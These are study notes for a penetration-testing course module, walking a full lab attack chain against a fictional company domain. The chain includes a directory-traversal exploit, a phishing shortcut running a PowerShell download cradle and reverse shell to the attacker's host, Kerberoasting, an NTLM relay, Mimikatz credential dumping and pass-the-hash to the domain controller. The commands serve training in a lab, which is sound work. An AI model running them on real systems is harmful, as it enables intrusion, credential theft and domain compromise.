---
title: "PWK Module 24 — Assembling the Pieces"
created: "2026-04-06"
type: reference-note
status: active
tags:
  - reference-note
  - active-directory
  - pentest-methodology
  - ntlm-relay
  - kerberoasting
  - lateral-movement
  - oscp
source: "PWK Module 24 — Assembling the Pieces"
---

# PWK Module 24 — Assembling the Pieces

## Overview

A complete end-to-end penetration test of the fictional company **BEYOND** (domain `beyond.com`). Connects every major technique from the course into one realistic attack chain: external recon → foothold → privilege escalation → phishing → internal enumeration → Kerberoasting → NTLM relay → credential dump → Domain Admin.

---

## Network Topology

```
[INTERNET / VPN]
    ├── MAILSRV1  (192.168.x.x)  — Windows, IIS + hMailServer, dual-homed (also 172.16.6.254)
    └── WEBSRV1   (192.168.x.x)  — Ubuntu 22.04, WordPress 6.0.2

[INTERNAL — 172.16.6.0/24]
    ├── CLIENTWK1    (172.16.6.243)  — Windows 11, domain workstation
    ├── INTERNALSRV1 (172.16.6.241)  — Windows, WordPress (Backup Migration plugin)
    ├── MAILSRV1     (172.16.6.254)  — dual-homed (also external)
    └── DCSRV1       (172.16.6.x)   — Domain Controller

[DOMAIN USERS]
    marcus   — domain user, active session on CLIENTWK1
    john     — domain user, credentials found in git history
    daniela  — domain user, SPN http/internalsrv1.beyond.com (Kerberoastable), local user on WEBSRV1
    beccy    — Domain Admin, active session on MAILSRV1
    Administrator — local admin on INTERNALSRV1 (same password as MAILSRV1 local admin)
```

---

## Work Environment Setup

```bash
mkdir -p ~/beyond/{mailsrv1,websrv1,webdav}
touch ~/beyond/creds.txt        # track all discovered credentials
touch ~/beyond/computer.txt     # track internal machines + IPs
```

---

## Phase 1 — External Enumeration

### MAILSRV1

```bash
nmap -sV -sC -oN beyond/mailsrv1/nmap MAILSRV1_IP
# Finds: IIS, hMailServer (SMTP/POP3/IMAP), Windows OS
# No exploits found for hMailServer version; IIS shows default page
gobuster dir -u http://MAILSRV1_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,pdf,config -o beyond/mailsrv1/gobuster
# No results — park MAILSRV1, return when credentials are found
```

### WEBSRV1

```bash
nmap -sV -sC -oN beyond/websrv1/nmap WEBSRV1_IP
# Finds: SSH (OpenSSH 8.9p1 Ubuntu 3 → Ubuntu 22.04), HTTP (Apache 2.4.52)
# SSH banner → "OpenSSH 8.9p1 Ubuntu 3" → Google → Ubuntu Jammy (22.04)

# Identify WordPress from page source (wp-content, wp-includes strings)
whatweb http://WEBSRV1_IP
# Confirms: WordPress 6.0.2

# Enumerate plugins
wpscan --url http://WEBSRV1_IP --enumerate p --plugins-detection aggressive -o beyond/websrv1/wpscan
# Found plugins: akismet, classic-editor, contact-form-7, duplicator 1.3.26, elementor, wordpress-seo
# Duplicator flagged as OUTDATED

searchsploit duplicator 1.3.26
# Two results — one standalone Python exploit (CVE-2020-11738), one Metasploit
```

---

## Phase 2 — Initial Foothold on WEBSRV1

### CVE-2020-11738 — Duplicator Directory Traversal

```bash
searchsploit -x 50420         # review the exploit
searchsploit -m 50420         # copy to working directory
cp 50420.py beyond/websrv1/

# Exploit: GET /wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../etc/passwd
python3 50420.py http://WEBSRV1_IP /etc/passwd
# Output: /etc/passwd → users daniela, marcus identified → add to creds.txt

# Retrieve SSH private key
python3 50420.py http://WEBSRV1_IP /home/daniela/.ssh/id_rsa
# Saves key → chmod 600 id_rsa

# Try marcus too
python3 50420.py http://WEBSRV1_IP /home/marcus/.ssh/id_rsa
# Not found — only daniela has a key
```

### Crack SSH Key Passphrase

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
# Cracked: <passphrase> → add to creds.txt

ssh -i id_rsa daniela@WEBSRV1_IP
# Enter passphrase → shell on WEBSRV1 as daniela
```

---

## Phase 3 — Privilege Escalation on WEBSRV1

### linPEAS Enumeration

```bash
# On Kali
cp /usr/share/peass/linpeas/linpeas.sh beyond/websrv1/
python3 -m http.server 80

# On WEBSRV1
wget http://KALI_IP/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

**Key findings:**
1. `daniela` can run `/usr/bin/git` with `sudo` — **no password required**
2. WordPress DB cleartext password in `/srv/www/wordpress/wp-config.php`
3. WordPress directory (`/srv/www/wordpress`) is a **Git repository**

### PrivEsc via sudo git (GTFOBins)

```bash
# GTFOBins → git → Sudo section
sudo git -p help config
# Opens help in pager (less)
# In pager, type:
!/bin/bash
# → root shell
```

### Extract Credentials from Git History

```bash
cd /srv/www/wordpress
git log
# Shows 2 commits:
# HEAD: "Removed staging script and internal network access"
# Initial commit

git show <LATEST_COMMIT_HASH>
# Diff reveals removed staging script — contains:
# sshpass -p '<PASSWORD>' ssh john@<INTERNAL_IP>
# → Username: john, Password: <from diff> → add to creds.txt
```

**Note:** `git show` displays diff safely without checking out (avoids disrupting live app).

---

## Phase 4 — Pivoting via Phishing (MAILSRV1)

### Validate Credentials Against MAILSRV1

```bash
crackmapexec smb MAILSRV1_IP -u usernames.txt -p passwords.txt -d beyond.com --continue-on-success
# Hit: john:<password> → BEYOND\john — valid domain credentials!
# No Pwn3d! → john is NOT local admin on MAILSRV1

crackmapexec smb MAILSRV1_IP -u john -p '<password>' -d beyond.com --shares
# Only default shares (C$, ADMIN$, IPC$) — no interesting access
```

### Phishing Setup — Windows Library + Shortcut + Powercat

```bash
# 1. Start WebDAV (serves .Library-ms to victim)
mkdir ~/beyond/webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root=~/beyond/webdav/

# 2. Create config.Library-ms (on WINPREP or manually)
# Point WebDAV URL to Kali IP

# 3. Create install.lnk shortcut (on Windows machine)
# Target: powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP:8000/powercat.ps1');powercat -c KALI_IP -p 4444 -e powershell"
# Copy install.lnk to ~/beyond/webdav/

# 4. Serve Powercat
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 ~/beyond/
python3 -m http.server 8000

# 5. Start listener
nc -lnvp 4444
```

### Send Phishing Email via swaks

```bash
# Create email body
cat > ~/beyond/body.txt << 'EOF'
Hello,

Please review the attached staging configuration file.
It contains important settings for our deployment.

Regards,
John
EOF

# Send email with attachment
swaks -t daniela@beyond.com -t marcus@beyond.com \
  --from john@beyond.com \
  --attach ~/beyond/config.Library-ms \
  --server MAILSRV1_IP \
  --body ~/beyond/body.txt \
  --header "Subject: Staging Script" \
  --suppress-data -ap
# Enter john's credentials when prompted
```

**Result:** Marcus opens the attachment → WebDAV delivers Library file → shortcut executes → Powercat connects back → shell on `CLIENTWK1` (172.16.6.243) as `marcus`.

---

## Phase 5 — Internal Enumeration

### CLIENTWK1 Local Enumeration

```powershell
# Download winPEAS
iwr http://KALI_IP:8000/winPEAS.exe -OutFile winPEAS.exe
.\winPEAS.exe
# Key findings: Windows 11 (winPEAS falsely reports Win10 — verify with systeminfo!)
# No AV detected
# DNS cache: mailsrv1.beyond.com (172.16.6.254), dcsrv1.beyond.com
```

### BloodHound Collection

```powershell
iwr http://KALI_IP:8000/SharpHound.ps1 -OutFile SharpHound.ps1
powershell -ep bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\marcus\Desktop -OutputPrefix 'beyond'"
# Transfer zip to Kali
```

### BloodHound Analysis — Custom Cypher Queries

```cypher
-- List all computers
MATCH (m:Computer) RETURN m
-- Found: CLIENTWK1, MAILSRV1, INTERNALSRV1, DCSRV1

-- List all users
MATCH (m:User) RETURN m
-- Found: beccy, john, daniela, marcus (+ default AD accounts)

-- Active sessions (who is logged in where)
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
-- beccy (DA!) has session on MAILSRV1
-- Local Administrator (RID 500) has session on INTERNALSRV1
-- marcus has session on CLIENTWK1

-- Kerberoastable accounts
-- Pre-built: "List all Kerberoastable Accounts"
-- daniela → SPN: http/internalsrv1.beyond.com
```

**Mark as Owned:** Right-click MARCUS → Mark as Owned; JOHN → Mark as Owned.

**Key intelligence gathered:**
- `beccy` (DA) has active session on `MAILSRV1` → cached credentials
- Local Administrator session on `INTERNALSRV1` → same password as `MAILSRV1` local admin (assumption)
- `daniela` is Kerberoastable (SPN → likely WordPress admin on INTERNALSRV1)
- `MAILSRV1` and `INTERNALSRV1` have **SMB signing disabled** → relay attacks possible

### Meterpreter + SOCKS5 Proxy for Internal Scanning

```bash
# Generate Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o beyond/met.exe

# Metasploit listener
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST KALI_IP; set LPORT 443
set ExitOnSession false
run -j

# On CLIENTWK1: download and execute met.exe
# Once session opens in MSF:
use multi/manage/autoroute
set SESSION 1; run

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1; set VERSION 5; run -j
```

```bash
# Scan internal hosts via proxychains
proxychains crackmapexec smb 172.16.6.240/24 -u john -p '<password>' -d beyond.com --shares
# MAILSRV1 → SMB signing: False
# INTERNALSRV1 → SMB signing: False

proxychains nmap -sT -Pn -n -p 80,443,8080 172.16.6.241
# INTERNALSRV1 → ports 80, 443 open
```

### Chisel — Stable Browser Access to Internal Web

```bash
# Kali: start Chisel server
./chisel server --port 8080 --reverse

# CLIENTWK1 (via Meterpreter upload + shell):
.\chisel.exe client KALI_IP:8080 R:80:172.16.6.241:80

# Browse http://127.0.0.1 on Kali → hits INTERNALSRV1 WordPress
# Add to /etc/hosts: 127.0.0.1 internalsrv1.beyond.com
```

---

## Phase 6 — Kerberoast daniela → WordPress Access

```bash
proxychains impacket-GetUserSPNs -dc-ip 172.16.6.x -request beyond.com/john:'<password>'
# Returns TGS-REP hash for daniela → save to beyond/daniela.hash

hashcat -m 13100 beyond/daniela.hash /usr/share/wordlists/rockyou.txt -r best64.rule --force
# Cracked: daniela:<password> → add to creds.txt
```

Log into `http://internalsrv1.beyond.com/wp-admin` as `daniela` → success.

---

## Phase 7 — NTLM Relay via WordPress Plugin

### The Attack Chain Logic

```
INTERNALSRV1 WordPress (running as local Administrator)
    → Backup Migration plugin forced to authenticate to Kali
    → impacket-ntlmrelayx relays to MAILSRV1 (SMB signing disabled)
    → INTERNALSRV1 local Admin password = MAILSRV1 local Admin password
    → Code execution as NT AUTHORITY\SYSTEM on MAILSRV1
    → Mimikatz dumps beccy's NTLM hash (beccy has active session on MAILSRV1)
```

### Setup

```bash
# 1. Start NTLM relay listener
impacket-ntlmrelayx --no-http-server -smb2support \
  -t MAILSRV1_IP \
  -c "powershell -enc <BASE64_REVERSE_SHELL_PORT_9999>"

# 2. Start Netcat listener
nc -lnvp 9999
```

### Trigger Authentication

In WordPress admin → Plugins → Backup Migration → Manage → Backup directory path:

```
//KALI_IP/test
```

Click Save → WordPress authenticates to Kali as `INTERNALSRV1\Administrator` → relayed to MAILSRV1 → SYSTEM shell on MAILSRV1.

---

## Phase 8 — Credential Dump → Domain Admin

### Upgrade to Meterpreter on MAILSRV1

```powershell
# In SYSTEM shell on MAILSRV1
iwr http://KALI_IP:8000/met.exe -OutFile met.exe; .\met.exe
# New Meterpreter session in MSF
```

### Dump Credentials with Mimikatz

```powershell
# In Meterpreter → shell → download Mimikatz
iwr http://KALI_IP:8000/mimikatz.exe -OutFile mimikatz.exe
.\mimikatz.exe

privilege::debug
sekurlsa::logonpasswords
# beccy's NTLM hash found (active session on MAILSRV1) → add to creds.txt
```

### Pass the Hash to Domain Controller

```bash
impacket-psexec -hashes :BECCY_NTLM_HASH beccy@DCSRV1_IP
# NT AUTHORITY\SYSTEM shell on DCSRV1 → Domain compromised!
```

---

## Full Attack Chain Summary

```
WEBSRV1 (external)
  → CVE-2020-11738 directory traversal (Duplicator 1.3.26)
  → /etc/passwd (users) + /home/daniela/.ssh/id_rsa (SSH key)
  → ssh2john + john → SSH as daniela
  → linPEAS: sudo git (no password), WordPress git repo, DB password
  → GTFOBins: sudo git -p help → pager → !/bin/bash → root
  → git show: removed staging script → john's credentials
      ↓
MAILSRV1 (validate credentials)
  → crackmapexec: john valid domain user, not local admin, no shares
  → WebDAV + Library file + shortcut (Powercat) phishing via swaks
  → marcus opens → reverse shell → CLIENTWK1 (internal foothold)
      ↓
CLIENTWK1 (internal enumeration)
  → winPEAS: Windows 11, no AV, internal DNS cache
  → SharpHound → BloodHound: beccy = DA (session on MAILSRV1), daniela = Kerberoastable
  → Meterpreter → autoroute → SOCKS5 → internal network scan
  → SMB signing disabled on MAILSRV1 + INTERNALSRV1
  → Chisel: browse INTERNALSRV1 WordPress
      ↓
INTERNALSRV1 (Kerberoast + relay)
  → impacket-GetUserSPNs: daniela TGS-REP hash → hashcat → password
  → Login WordPress as daniela
  → Backup Migration plugin: set path to //KALI_IP/test
  → impacket-ntlmrelayx → relay to MAILSRV1 → SYSTEM shell
      ↓
MAILSRV1 (credential dump)
  → Meterpreter + Mimikatz: sekurlsa::logonpasswords → beccy NTLM hash
      ↓
DCSRV1 (Domain Admin)
  → impacket-psexec -hashes :beccy_hash beccy@DCSRV1 → SYSTEM
  → DOMAIN COMPROMISED
```

---

## Key Methodology Takeaways

1. **Document everything** — `creds.txt` and `computer.txt` from the start; credentials reused across machines
2. **Cyclical enumeration** — MAILSRV1 was useless initially; became pivot point after credentials found
3. **Don't need DA on every box** — CLIENTWK1 didn't need PrivEsc; enumeration was the priority
4. **Assumptions are hypotheses** — "same local admin password" was an assumption, validated by the relay
5. **SMB signing disabled = relay opportunity** — always check when enumerating internal hosts
6. **winPEAS falsely reports Windows 10 for Windows 11** — always verify OS with `systeminfo`
7. **Git history leaks credentials** — `git log` + `git show` on found repositories

---

## Connections

- [[PWK-Module-12-Client-Side-Attacks]] — Windows Library + WebDAV + shortcut phishing chain
- [[PWK-Module-21-Active-Directory-Enumeration]] — BloodHound custom Cypher queries, SharpHound
- [[PWK-Module-22-Attacking-AD-Authentication]] — Kerberoasting daniela
- [[PWK-Module-23-Lateral-Movement-AD]] — Pass the Hash to DC
- [[PWK-Module-20-Metasploit-Framework]] — Meterpreter, autoroute, SOCKS5
- [[Pentest-Methodology-Mindset]] — the mental model for chaining all techniques together

---

## Practice Labs

| Room / Machine | Platform | What it practices |
|----------------|----------|-------------------|
| [Archetype](https://app.hackthebox.com/machines/Archetype) | HackTheBox | End-to-end Windows AD chain: MSSQL → SMB → WinRM → cred reuse → domain compromise |
| [Unified](https://app.hackthebox.com/machines/Unified) | HackTheBox | Log4Shell (CVE-2021-44228) initial foothold → MongoDB credential extraction → admin panel RCE |
| [Wreath](https://tryhackme.com/room/wreath) | TryHackMe | Multi-machine network: initial foothold → pivoting → internal target exploitation (full chain) |

---

*From: PWK Module 24*
